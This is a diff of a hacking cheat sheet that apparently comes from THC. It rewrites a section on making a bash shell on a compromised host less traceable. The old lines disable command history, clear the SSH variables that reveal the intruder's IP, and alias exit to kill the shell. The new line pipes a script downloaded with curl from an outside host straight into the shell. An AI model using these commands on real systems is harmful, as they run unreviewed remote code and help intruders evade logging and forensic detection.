@@ -115,22 +115,14 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 <a id="bash"></a>
 ## 1. Bash / Shell
 <a id="bash-no-history"></a>
-**1.i. Leave Bash without history:**
+**1.i. Set up a Hack Shell (bash):**
 
-Tell Bash to use */dev/null* instead of *~/.bash_history*. This is the first command we execute on every shell. It will stop the Bash from logging your commands. 
-
+Make BASH less noisy. Disables *~/.bash_history*, clears SSH_* and many other things.
 ```sh
-export HISTFILE=/dev/null
-unset SSH_CONNECTION SSH_CLIENT
+source <(curl -SsfL https://thc.org/hs)
 ```
 
-(We also clear SSH_* variables in case we logged in with SSH. Otherwise any process we start gets a copy of our IP in /proc/self/environ.)
-
-It is good housekeeping to 'commit suicide' when exiting a shell:
-```sh
-alias exit='kill -9 $$'
-```
-
+Bonus tip:
 Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
 ```
 $  id
